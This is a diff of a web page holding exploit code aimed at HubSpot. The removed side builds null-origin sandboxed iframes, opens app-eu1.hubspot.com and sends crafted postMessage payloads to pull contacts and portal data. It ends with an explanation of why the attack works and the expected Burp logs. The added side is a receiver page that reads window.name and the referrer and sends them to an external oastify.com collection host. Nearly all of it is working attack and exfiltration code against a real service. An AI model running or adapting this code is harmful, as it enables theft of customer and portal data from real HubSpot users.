@@ -1,303 +1,51 @@
 <!DOCTYPE html>
 <html>
-<head><title>Processing</title></head>
+<head><title>Receiver</title></head>
 <body>
-<h1>Loading...</h1>
-<div id="log"></div>
+<h1>Data Receiver</h1>
+<div id="data" style="word-wrap:break-word;max-width:800px;"></div>
 <script>
-const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
+const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 
-function log(m) {
-    document.getElementById('log').innerHTML += '<br>' + m;
-    new Image().src = E + '/?log=' + encodeURIComponent(m);
-}
+// Read window.name
+const name = window.name;
+const ref = document.referrer;
 
-log('relay_loaded');
+document.getElementById('data').innerHTML = 
+    '<strong>Window Name:</strong> ' + (name || '(empty)') + '<br><br>' +
+    '<strong>Referrer:</strong> ' + (ref || '(none)') + '<br><br>' +
+    '<strong>Length:</strong> ' + name.length + ' chars';
 
-// Method 1: Create first sandbox - this gets null origin
-const sandbox1 = document.createElement('iframe');
-sandbox1.sandbox = 'allow-scripts allow-popups allow-same-origin';
-sandbox1.style.cssText = 'width:100%;height:250px;border:2px solid blue';
+// Exfiltrate
+new Image().src = EXFIL + '/?name=' + encodeURIComponent(name);
+new Image().src = EXFIL + '/?ref=' + encodeURIComponent(ref);
+new Image().src = EXFIL + '/?len=' + name.length;
 
-sandbox1.srcdoc = `
-<!DOCTYPE html>
-<html>
-<body>
-<h3>Sandbox 1 (Null Origin)</h3>
-<div id="s1"></div>
-<script>
-const E1 = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
-function l1(m) {
-    document.getElementById('s1').innerHTML += '<br>' + m;
-    new Image().src = E1 + '/?s1=' + encodeURIComponent(m);
-}
-
-l1('sandbox1_origin=' + window.origin);
-
-// Open HubSpot - it will ALSO have null origin due to inheritance!
-l1('opening_hubspot');
-let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');
-
-if (!hub) {
-    l1('blocked');
-} else {
-    l1('opened');
+// If data starts with "HUBSPOT_DATA:", extract it
+if (name.startsWith('HUBSPOT_DATA:')) {
+    const extracted = name.substring(13);
+    new Image().src = EXFIL + '/?extracted=' + encodeURIComponent(extracted);
     
-    // Poll until HubSpot loads
-    let attempts = 0;
-    let checker = setInterval(() => {
-        attempts++;
-        
-        try {
-            hub.origin; // Will throw when loaded
-            if (attempts % 20 === 0) l1('wait_' + attempts);
-        } catch(e) {
-            clearInterval(checker);
-            l1('hubspot_loaded_' + attempts);
-            l1('error_msg=' + e.message);
-            
-            // CRITICAL: Both windows now have NULL origin!
-            // This means event.origin === window.origin checks will PASS
-            
-            // Set up listener for responses
-            window.addEventListener('message', function(resp) {
-                if (resp.source === hub) {
-                    l1('RESPONSE_origin=' + resp.origin);
-                    l1('RESPONSE_type=' + (resp.data.type || 'unknown'));
-                    
-                    const data = JSON.stringify(resp.data);
-                    l1('RESPONSE_preview=' + data.substring(0, 150));
-                    
-                    // Full exfiltration
-                    new Image().src = E1 + '/?response=' + encodeURIComponent(data.substring(0, 800));
-                    
-                    fetch(E1 + '/response', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: data
-                    });
-                }
-            });
-            
-            // Now send exploits - these will have null origin matching HubSpot's null origin!
-            setTimeout(() => {
-                l1('EXPLOIT_1_content_assistance');
-                
-                // This handler had NO origin check in your logs!
-                hub.postMessage({
-                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                    commandId: 'getPortalData',
-                    featureId: 'crm',
-                    parameters: {
-                        portalId: '46962361',
-                        action: 'getAllContacts',
-                        includeProperties: true
-                    },
-                    resultCount: 100,
-                    language: 'en',
-                    objectId: '46962361',
-                    applicationId: 'crm',
-                    basePath: '/crm/v3/objects/contacts',
-                    maxPollingAttempts: 10,
-                    pollingInterval: 500
-                }, '*');
-            }, 1000);
-            
-            setTimeout(() => {
-                l1('EXPLOIT_2_raw_redux');
-                
-                hub.postMessage({
-                    type: 'raw',
-                    _callbackId: 'exploit_' + Date.now(),
-                    body: {
-                        action: 'reduxAction',
-                        type: 'GET_PORTAL_INFO',
-                        payload: {
-                            portalId: '46962361',
-                            includeUsers: true,
-                            includeSettings: true
-                        }
-                    }
-                }, '*');
-            }, 2000);
-            
-            setTimeout(() => {
-                l1('EXPLOIT_3_content_embed');
-                
-                // From your logs: ContentEmbedUIEvents
-                hub.postMessage({
-                    type: 'raw',
-                    body: {
-                        action: 'SET_CONTENT_DONE',
-                        payload: {
-                            getData: true,
-                            portalId: '46962361'
-                        }
-                    }
-                }, '*');
-            }, 3000);
-            
-            setTimeout(() => {
-                l1('EXPLOIT_4_feedback_delegated');
-                
-                // This one also appeared in your logs
-                hub.postMessage({
-                    type: 'CONTENT_ASSISTANCE_DELEGATED_FEEDBACK',
-                    feedbackAnnotatedCompletions: {
-                        portalId: '46962361',
-                        extractData: true,
-                        contacts: true
-                    }
-                }, '*');
-            }, 4000);
-            
-            setTimeout(() => {
-                l1('EXPLOIT_5_null_origin_bypass');
-                
-                // Handlers that check: if (e.origin !== window.origin)
-                // Since both are null, this passes!
-                hub.postMessage({
-                    type: 'TOGGLE_DARK_MODE',
-                    isDarkMode: true,
-                    bypassOriginCheck: true
-                }, '*');
-            }, 5000);
-            
-            // Try to enumerate portal data
-            setTimeout(() => {
-                l1('EXPLOIT_6_enumeration');
-                
-                for (let i = 0; i < 5; i++) {
-                    hub.postMessage({
-                        type: 'raw',
-                        _callbackId: 'enum_' + i,
-                        body: {
-                            action: 'getContact',
-                            contactId: i
-                        }
-                    }, '*');
-                }
-            }, 6000);
-        }
-        
-        if (attempts > 150) {
-            clearInterval(checker);
-            l1('timeout');
-        }
-    }, 100);
-}
-</script>
-</body>
-</html>
-`;
-
-document.body.appendChild(sandbox1);
-log('sandbox1_created');
-
-// Method 2: Create second sandbox that will try to access HubSpot's opener
-setTimeout(() => {
-    log('creating_sandbox2_opener_attack');
-    
-    const sandbox2 = document.createElement('iframe');
-    sandbox2.sandbox = 'allow-scripts allow-popups allow-same-origin allow-top-navigation';
-    sandbox2.style.cssText = 'width:100%;height:250px;border:2px solid red';
-    
-    sandbox2.srcdoc = `
-<!DOCTYPE html>
-<html>
-<body>
-<h3>Sandbox 2 (Opener Attack)</h3>
-<div id="s2"></div>
-<script>
-const E2 = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
-function l2(m) {
-    document.getElementById('s2').innerHTML += '<br>' + m;
-    new Image().src = E2 + '/?s2=' + encodeURIComponent(m);
-}
-
-l2('sandbox2_origin=' + window.origin);
-
-// Try to get reference to already-opened HubSpot window
-l2('attempting_window_reuse');
-
-// Open with SAME name as sandbox1 used - should get existing window!
-let hub2 = window.open('', 'hubspot');
-
-if (hub2 && hub2.location) {
-    l2('got_existing_window');
-    
+    // Try to parse as JSON
     try {
-        l2('window_origin=' + hub2.origin);
+        const parsed = JSON.parse(extracted);
+        new Image().src = EXFIL + '/?parsed=success&keys=' + Object.keys(parsed).join(',');
     } catch(e) {
-        l2('origin_check_failed=' + e.message);
+        new Image().src = EXFIL + '/?parsed=failed';
     }
-    
-    // Since we have null origin, try accessing
-    setTimeout(() => {
-        l2('sending_from_sandbox2');
-        
-        hub2.postMessage({
-            type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-            commandId: 'sandbox2_request',
-            featureId: 'test',
-            parameters: {},
-            resultCount: 1,
-            language: 'en',
-            objectId: '1',
-            applicationId: 'test',
-            basePath: '/',
-            maxPollingAttempts: 1,
-            pollingInterval: 100
-        }, '*');
-        
-        l2('message_sent_from_sandbox2');
-    }, 2000);
-} else {
-    l2('could_not_reuse_window');
 }
+
+// Send full POST
+fetch(EXFIL + '/data', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify({
+        name: name,
+        referrer: ref,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+    })
+});
 </script>
 </body>
 </html>
-    `;
-    
-    document.body.appendChild(sandbox2);
-    log('sandbox2_created');
-}, 3000);
-
-if (window.opener) {
-    window.opener.postMessage({status: 'ready'}, '*');
-}
-</script>
-</body>
-</html>
-```
-
----
-
-## **Why This is Powerful:**
-
-1. **Sandbox 1** opens HubSpot with `null` origin
-2. **Both windows have `null` origin** (inheritance)
-3. **Origin checks like `e.origin !== window.origin` PASS** because `null === null`
-4. **Sandbox 2** tries to reuse the same window (advanced technique)
-5. **Multiple exploit payloads** targeting different handlers
-6. **Comprehensive response logging**
-
----
-
-## **Expected Burp Logs:**
-```
-/?log=relay_loaded
-/?log=sandbox1_created
-/?s1=sandbox1_origin=null               ← NULL ORIGIN CONFIRMED
-/?s1=opening_hubspot
-/?s1=opened
-/?s1=hubspot_loaded_25
-/?s1=EXPLOIT_1_content_assistance
-/?s1=EXPLOIT_2_raw_redux
-/?s1=RESPONSE_origin=null               ← HUBSPOT RESPONDS!
-/?s1=RESPONSE_type=CONTENT_ASSISTANCE_DELEGATED_RESPONSE
-/?response={"results":[...]}            ← THE DATA!!!
-/?log=sandbox2_created
-/?s2=sandbox2_origin=null
-/?s2=got_existing_window
